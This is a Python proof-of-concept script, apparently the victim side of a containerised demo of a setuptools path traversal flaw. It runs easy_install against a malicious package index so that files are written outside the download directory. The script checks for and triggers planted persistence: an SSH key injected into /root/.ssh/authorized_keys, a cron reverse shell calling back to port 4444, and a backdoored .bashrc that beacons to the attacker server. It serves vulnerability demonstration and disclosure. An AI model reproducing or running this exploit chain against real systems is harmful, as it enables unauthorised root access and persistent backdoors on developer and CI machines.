#!/usr/bin/env python3
"""
Victim Client - Demonstrates the path traversal vulnerability

This simulates a developer/CI system that runs easy_install pointing
to a malicious package index, triggering the path traversal vulnerability.

The attack occurs during package resolution - before any code is even executed.
"""

import os
import subprocess
import sys
import time
import urllib.request

# Target directories that will be written to via path traversal
TARGET_DIRS = [
    "/etc/cron.d",
    "/root/.ssh",
    "/home/victim",
]


def setup_environment():
    """Create target directories for container testing."""
    print("[VICTIM] Setting up target directories...")
    for d in TARGET_DIRS:
        os.makedirs(d, exist_ok=True)
        print(f"         Created: {d}")


def wait_for_server(host, port, timeout=30):
    """Wait for the malicious server to be available."""
    import socket
    print(f"[VICTIM] Waiting for malicious server at {host}:{port}...")

    start = time.time()
    while time.time() - start < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((host, port))
            sock.close()
            if result == 0:
                print(f"[VICTIM] Server is up!")
                return True
        except:
            pass
        time.sleep(1)

    print(f"[VICTIM] Timeout waiting for server")
    return False


def run_pip_install_attack(server_host, server_port, scenario_name):
    """
    Execute the attack using pip/easy_install pointing to malicious index.

    This simulates a real-world attack where a developer or CI system
    installs a package from a compromised or typosquatted package index.
    """
    print(f"\n{'=' * 60}")
    print(f"EXECUTING ATTACK: {scenario_name.upper()}")
    print("=" * 60)

    # Switch scenario on server
    try:
        urllib.request.urlopen(f"http://{server_host}:{server_port}/scenario/{scenario_name}")
    except:
        pass

    time.sleep(0.5)

    index_url = f"http://{server_host}:{server_port}/simple/"

    targets = {
        "cron": "/etc/cron.d/backdoor",
        "ssh": "/root/.ssh/authorized_keys",
        "bashrc": "/home/victim/.bashrc",
    }
    target = targets.get(scenario_name, targets["cron"])

    print(f"\n[VICTIM] Simulating: Developer installs package from untrusted index")
    print(f"[VICTIM] Command: easy_install --index-url {index_url} malicious-package")
    print(f"[VICTIM] Target file: {target}")
    print()

    # Use easy_install which uses setuptools' vulnerable PackageIndex
    # The vulnerability triggers during the package resolution/download phase
    result = subprocess.run(
        [
            sys.executable, "-m", "easy_install",
            "--index-url", index_url,
            "malicious-package"
        ],
        capture_output=True,
        text=True,
        timeout=30
    )

    print("[VICTIM] easy_install output:")
    print("-" * 40)
    if result.stdout:
        print(result.stdout)
    if result.stderr:
        print(result.stderr)
    print("-" * 40)

    # Check if attack succeeded (file written via path traversal)
    if os.path.exists(target):
        print(f"\n[EXPLOITED] File written to: {target}")
        print(f"\n[FILE CONTENTS]")
        print("-" * 40)
        with open(target, 'r') as f:
            print(f.read())
        print("-" * 40)
        return True
    else:
        print(f"\n[FAILED] File not created at: {target}")
        return False


def validate_attacks(server_host, server_port):
    """Validate that the attacks had real impact."""

    # 1. Validate SSH - have attacker try to connect back
    print("\n[VALIDATION 1] SSH Key Injection")
    print("-" * 40)
    if os.path.exists("/root/.ssh/authorized_keys"):
        print("[+] authorized_keys file exists")
        with open("/root/.ssh/authorized_keys", 'r') as f:
            key = f.read().strip()
        print(f"[+] Injected key: {key[:60]}...")

        # Ask attacker server to validate SSH access
        print("[*] Requesting attacker to validate SSH access...")
        time.sleep(1)  # Give sshd time to see the key
        try:
            resp = urllib.request.urlopen(
                f"http://{server_host}:{server_port}/validate/ssh",
                timeout=15
            )
            result = resp.read().decode()
            if "SSH_ACCESS_CONFIRMED" in result or "ACCESS CONFIRMED" in result:
                print("[!] ATTACKER SUCCESSFULLY SSH'd INTO VICTIM!")
            else:
                print("[-] SSH validation returned but no confirmation")
        except Exception as e:
            print(f"[-] SSH validation request failed: {e}")
    else:
        print("[-] authorized_keys not found")

    # 2. Validate Cron
    print("\n[VALIDATION 2] Cron Backdoor")
    print("-" * 40)
    if os.path.exists("/etc/cron.d/backdoor"):
        print("[+] Cron backdoor file exists")
        with open("/etc/cron.d/backdoor", 'r') as f:
            content = f.read()
        print(f"[+] Cron job content:")
        print(content)
        if "server" in content and "4444" in content:
            print("[!] REVERSE SHELL CRON JOB INSTALLED!")
            print("[!] Would connect to attacker every minute")
    else:
        print("[-] Cron backdoor not found")

    # 3. Validate Bashrc - trigger the beacon
    print("\n[VALIDATION 3] Bashrc Backdoor")
    print("-" * 40)
    if os.path.exists("/home/victim/.bashrc"):
        print("[+] Backdoored .bashrc exists")
        with open("/home/victim/.bashrc", 'r') as f:
            content = f.read()
        print("[+] Bashrc content:")
        print(content)

        print("[*] Triggering bashrc by spawning login shell...")
        try:
            # Source the bashrc to trigger the beacon
            subprocess.run(
                ["bash", "-c", "source /home/victim/.bashrc"],
                timeout=5,
                capture_output=True
            )
            print("[*] Bashrc sourced - check attacker server for beacon")
            time.sleep(2)

            # Check if beacon was received
            resp = urllib.request.urlopen(
                f"http://{server_host}:{server_port}/status",
                timeout=5
            )
            status = resp.read().decode()
            if "victim" in status.lower() or "Beacons Received" in status:
                print("[!] BEACON CALLBACK CONFIRMED ON ATTACKER SERVER!")
        except Exception as e:
            print(f"[-] Bashrc trigger failed: {e}")
    else:
        print("[-] Backdoored bashrc not found")


def main():
    server_host = os.environ.get("SERVER_HOST", "server")
    server_port = int(os.environ.get("SERVER_PORT", "8080"))

    print("=" * 60)
    print("SETUPTOOLS PATH TRAVERSAL VULNERABILITY DEMO")
    print("=" * 60)
    print()
    print("This demonstrates CVE in setuptools where a malicious package")
    print("index can write files to arbitrary paths during package install.")
    print()
    print("Attack vector: Developer runs easy_install with untrusted index")
    print(f"Malicious index: http://{server_host}:{server_port}/simple/")
    print()

    # Setup
    setup_environment()

    # Wait for server
    if not wait_for_server(server_host, server_port):
        print("[VICTIM] Could not connect to server, exiting")
        sys.exit(1)

    time.sleep(1)

    # Run all three attack scenarios
    scenarios = ["cron", "ssh", "bashrc"]
    results = []

    for scenario in scenarios:
        success = run_pip_install_attack(server_host, server_port, scenario)
        results.append((scenario, success))
        time.sleep(1)

    # Summary
    print(f"\n{'=' * 60}")
    print("ATTACK SUMMARY")
    print("=" * 60)

    for scenario, success in results:
        status = "EXPLOITED" if success else "FAILED"
        print(f"  [{status}] {scenario}")

    print(f"\n[PROOF] Files created outside download directory:")
    os.system("find /etc/cron.d /root/.ssh /home/victim -type f 2>/dev/null")

    # Validate attacks
    print(f"\n{'=' * 60}")
    print("VALIDATING ATTACKS")
    print("=" * 60)

    validate_attacks(server_host, server_port)

    print(f"\n{'=' * 60}")
    print("DEMONSTRATION COMPLETE")
    print("=" * 60)

    return 0 if all(r[1] for r in results) else 1


if __name__ == "__main__":
    sys.exit(main())
